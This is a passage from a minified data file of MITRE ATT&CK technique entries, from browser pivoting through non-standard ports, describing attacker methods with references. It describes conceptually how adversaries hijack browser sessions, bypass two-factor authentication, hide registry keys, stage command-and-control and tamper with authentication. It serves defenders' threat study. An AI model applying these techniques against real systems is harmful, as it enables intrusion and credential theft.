a way to pivot into an authenticated intranet. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cobaltstrike.com\u002Fhelp-browser-pivoting'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.icebrg.io\u002Fblog\u002Fmalicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcobaltstrike.com\u002Fdownloads\u002Fcsmanual38.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1185",external_id:wR},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FMan-in-the-browser",description:"Wikipedia. (2017, October 28). Man-in-the-browser. Retrieved January 10, 2018.",source_name:"Wikipedia Man in the Browser"},{url:"https:\u002F\u002Fwww.cobaltstrike.com\u002Fhelp-browser-pivoting",description:"Mudge, R. (n.d.). Browser Pivoting. Retrieved January 10, 2018.",source_name:"Cobalt Strike Browser Pivot"},{url:lq,description:lr,source_name:ls},{url:"https:\u002F\u002Fcobaltstrike.com\u002Fdownloads\u002Fcsmanual38.pdf",description:"Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.",source_name:"cobaltstrike manual"}],tactics:[m]},{id:da,"object-type":a,name:"Man-in-the-Middle",description:"Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1040'\u003ENetwork Sniffing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F002'\u003ETransmitted Data Manipulation\u003C\u002Fa\u003E. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.rapid7.com\u002Ffundamentals\u002Fman-in-the-middle-attacks\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may leverage the MiTM position to attempt to modify traffic, such as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F002'\u003ETransmitted Data Manipulation\u003C\u002Fa\u003E. Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.",external_references:[{source_name:b,external_id:da,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557"},{external_id:"CAPEC-94",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F94.html"},{source_name:"Rapid7 MiTM Basics",url:"https:\u002F\u002Fwww.rapid7.com\u002Ffundamentals\u002Fman-in-the-middle-attacks\u002F",description:"Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March 2, 2020."}],tactics:[r,m],subtechniques:[wS,wU]},{id:aa,"object-type":a,name:"Masquerading",description:"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and\u002For security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:aa,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036"},{external_id:wW,source_name:c,url:wX},{source_name:wY,url:wZ,description:w_},{source_name:fP,description:fQ,url:fR},{source_name:fS,url:fT,description:fU}],tactics:[d],subtechniques:[w$,xb,xd,xf,xh,xj]},{id:aY,"object-type":a,name:"Modify Authentication Process",description:"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",external_references:[{source_name:b,external_id:aY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556"},{url:xl,description:xm,source_name:xn},{source_name:xo,description:xp,url:xq},{source_name:"Xorrior Authorization Plugins",url:"https:\u002F\u002Fxorrior.com\u002Fpersistent-credential-theft\u002F",description:"Chris Ross. (2018, October 17). Persistent Credential Theft with Authorization Plugins. Retrieved April 22, 2021."},{url:bK,description:bL,source_name:bM}],tactics:[r,d,k],subtechniques:[xr,xt,xy,xA]},{id:aZ,"object-type":a,name:"Modify Cloud Compute Infrastructure",description:"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:aZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578"},{source_name:am,url:an,description:ao}],tactics:[d],subtechniques:[xC,xK,xM,xO]},{id:xQ,"object-type":a,name:"Modify Registry",description:"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E may be used for local or remote Registry modification. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc732643.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and\u002For be ignored when read via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E or other utilities using the Win32 API. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fsysinternals\u002Fdownloads\u002Freghide'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may abuse these pseudo-hidden keys to conceal payloads\u002Fcommands used to maintain persistence. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fpoweliks-malware-hides-in-windows-registry\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fhiding-registry-keys-with-psreflect-b18ec5ac8353'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc754820.aspx'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Often \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E are required, along with access to the remote system's \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E for RPC communication.",external_references:[{source_name:b,external_id:xQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1112"},{external_id:"CAPEC-203",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F203.html"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc732643.aspx",description:"Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.",source_name:"Microsoft Reg"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fsysinternals\u002Fdownloads\u002Freghide",description:"Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.",source_name:"Microsoft Reghide NOV 2006"},{url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fpoweliks-malware-hides-in-windows-registry\u002F",description:"Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.",source_name:"TrendMicro POWELIKS AUG 2014"},{url:"https:\u002F\u002Fposts.specterops.io\u002Fhiding-registry-keys-with-psreflect-b18ec5ac8353",description:"Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.",source_name:"SpectorOps Hiding Reg Jul 2017"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc754820.aspx",description:"Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.",source_name:"Microsoft Remote"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Fevent-4657",description:"Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.",source_name:"Microsoft 4657 APR 2017"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsysinternals\u002Fdownloads\u002Fregdelnull",description:"Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.",source_name:"Microsoft RegDelNull July 2016"}],tactics:[d]},{id:dh,"object-type":a,name:"Modify System Image",description:"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",external_references:[{source_name:b,external_id:dh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601"},{source_name:db,url:dc,description:dd},{source_name:de,url:df,description:dg}],tactics:[d],subtechniques:[xR,xT]},{id:xV,"object-type":a,name:"Multi-Stage Channels",description:"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1008'\u003EFallback Channels\u003C\u002Fa\u003E in case the original first-stage communication path is discovered and blocked.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1104",external_id:xV}],tactics:[o]},{id:xW,"object-type":a,name:"Multiband Communication",description:"**This technique has been deprecated and should no longer be used.**\n\nSome adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",external_references:[{source_name:b,external_id:xW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1026"},{url:f,description:g,source_name:h}],tactics:[o]},{id:xX,"object-type":a,name:"Native API",description:"Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware\u002Fdevices, memory, and processes.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fundocumented.ntinternals.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.kernel.org\u002Fdoc\u002Fhtml\u002Fv4.12\u002Fcore-api\u002Fkernel-api.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API \u003Ccode\u003ECreateProcess()\u003C\u002Fcode\u003E or GNU \u003Ccode\u003Efork()\u003C\u002Fcode\u003E will allow programs and scripts to start other processes.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms682425'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.gnu.org\u002Fsoftware\u002Flibc\u002Fmanual\u002Fhtml_node\u002FCreating-a-Process.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002F\u002Fman7\u002Flibc.7.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.gnu.org\u002Fsoftware\u002Flibc\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers\u002Fabstractions to API functionalities and are designed for ease-of-use\u002Fportability of code.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdotnet.microsoft.com\u002Flearn\u002Fdotnet\u002Fwhat-is-dotnet-framework'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fcoreservices'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FOSX_Technology_Overview\u002FCocoaApplicationLayer\u002FCocoaApplicationLayer.html#\u002F\u002Fapple_ref\u002Fdoc\u002Fuid\u002FTP40001067-CH274-SW1'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Ffoundation'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",external_references:[{source_name:b,external_id:xX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106"},{source_name:"NT API Windows",url:"https:\u002F\u002Fundocumented.ntinternals.net\u002F",description:"The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25, 2020."},{source_name:"Linux Kernel API",url:"https:\u002F\u002Fwww.kernel.org\u002Fdoc\u002Fhtml\u002Fv4.12\u002Fcore-api\u002Fkernel-api.html",description:"Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API. Retrieved June 25, 2020."},{url:fK,description:fL,source_name:fM},{source_name:"GNU Fork",url:"https:\u002F\u002Fwww.gnu.org\u002Fsoftware\u002Flibc\u002Fmanual\u002Fhtml_node\u002FCreating-a-Process.html",description:"Free Software Foundation, Inc.. (2020, June 18). Creating a Process. Retrieved June 25, 2020."},{source_name:"Microsoft Win32",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002F",description:"Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved March 15, 2020."},{source_name:"LIBC",url:"https:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002F\u002Fman7\u002Flibc.7.html",description:"Kerrisk, M. (2016, December 12). libc(7) — Linux manual page. Retrieved June 25, 2020."},{source_name:"GLIBC",url:"https:\u002F\u002Fwww.gnu.org\u002Fsoftware\u002Flibc\u002F",description:"glibc developer community. (2020, February 1). The GNU C Library (glibc). Retrieved June 25, 2020."},{source_name:"Microsoft NET",url:"https:\u002F\u002Fdotnet.microsoft.com\u002Flearn\u002Fdotnet\u002Fwhat-is-dotnet-framework",description:"Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15, 2020."},{source_name:"Apple Core Services",url:"https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fcoreservices",description:"Apple. (n.d.). Core Services. Retrieved June 25, 2020."},{source_name:"MACOS Cocoa",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FOSX_Technology_Overview\u002FCocoaApplicationLayer\u002FCocoaApplicationLayer.html#\u002F\u002Fapple_ref\u002Fdoc\u002Fuid\u002FTP40001067-CH274-SW1",description:"Apple. (2015, September 16). Cocoa Application Layer. Retrieved June 25, 2020."},{source_name:"macOS Foundation",url:"https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Ffoundation",description:"Apple. (n.d.). Foundation. Retrieved July 1, 2020."}],tactics:[p]},{id:fY,"object-type":a,name:"Network Boundary Bridging",description:"Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F003'\u003EMulti-hop Proxy\u003C\u002Fa\u003E or exfiltration of data via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1020\u002F001'\u003ETraffic Duplication\u003C\u002Fa\u003E.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",external_references:[{source_name:b,external_id:fY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1599"}],tactics:[d],subtechniques:[xY]},{id:di,"object-type":a,name:"Network Denial of Service",description:"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2014\u002F11\u002Foperation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and to support other malicious activities, including distraction\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ic3.gov\u002Fmedia\u002F2012\u002FFraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, hacktivism, and extortion.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fen\u002Fus\u002Fenterprise\u002Fmedia\u002Fsecurity_response\u002Fwhitepapers\u002Fthe-continued-rise-of-ddos-attacks.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499'\u003EEndpoint Denial of Service\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:di,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1498"},{source_name:q$,url:ra,description:rb},{source_name:rc,url:rd,description:re},{source_name:rf,url:rg,description:rh},{source_name:at,url:au,description:av}],tactics:[j],subtechniques:[x_,ya]},{id:yc,"object-type":a,name:"Network Service Scanning",description:"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1046",external_id:yc},{external_id:"CAPEC-300",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F300.html"}],tactics:[i]},{id:yd,"object-type":a,name:"Network Share Discovery",description:"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FShared_resource'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc770880.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E can be used to query a remote system for available shared drives using the \u003Ccode\u003Enet view \\\\\\\\remotesystem\u003C\u002Fcode\u003E command. It can also be used to query shared drives on the local system using \u003Ccode\u003Enet share\u003C\u002Fcode\u003E.",external_references:[{source_name:b,external_id:yd,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1135"},{external_id:"CAPEC-643",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F643.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FShared_resource",description:"Wikipedia. (2017, April 15). Shared resource. Retrieved June 30, 2017.",source_name:"Wikipedia Shared Resource"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc770880.aspx",description:"Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30, 2017.",source_name:"TechNet Shared Folder"}],tactics:[i]},{id:ye,"object-type":a,name:"Network Sniffing",description:"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557\u002F001'\u003ELLMNR\u002FNBT-NS Poisoning and SMB Relay\u003C\u002Fa\u003E, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and\u002For Defense Evasion activities.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1040",external_id:ye},{external_id:"CAPEC-158",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F158.html"}],tactics:[r,i]},{id:yf,"object-type":a,name:"Non-Application Layer Protocol",description:"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FList_of_network_protocols_%28OSI_model%29'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected\u002Ftunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; \u003Csup\u003E\u003Ca href='http:\u002F\u002Fsupport.microsoft.com\u002FKB\u002F170292'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",external_references:[{source_name:b,external_id:yf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1095"},{url:"http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FList_of_network_protocols_%28OSI_model%29",description:"Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014.",source_name:"Wikipedia OSI"},{source_name:ap,url:aq,description:ar},{url:"http:\u002F\u002Fsupport.microsoft.com\u002FKB\u002F170292",description:"Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014.",source_name:"Microsoft ICMP"},{source_name:K,url:L,description:M},{url:f,description:g,source_name:h}],tactics:[o]},{id:yg,"object-type":a,name:"Non-Standard Port",description:"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fblogs\u002Fthreat-intelligence\u002Felfin-apt33-espionage'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or port 587\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fortinet.com\u002Fblog\u002Fthreat-research\u002Fanalysis-of-new-agent-tesla-spyware-variant.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis\u002Fparsing of network data.",external_references:[{source_name:b,external_id:yg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1571"},{source_name:"Symantec Elfin Mar 2019",url:"https:\u002F\u002Fwww.symantec.com\u002Fblogs\u002Fthreat-intelligence\u002Felfin-apt33-espionage",description:"Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019."},{source_name:"Fortinet Agent Tesla April 2018",url:"https:\u002F\u002Fwww.fortinet.com\u002Fblog\u002Fthreat-research\u002Fanalysis-of-new-agent-tesla-spyware-variant.html",description:"Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware Variant. Retrieved November 5, 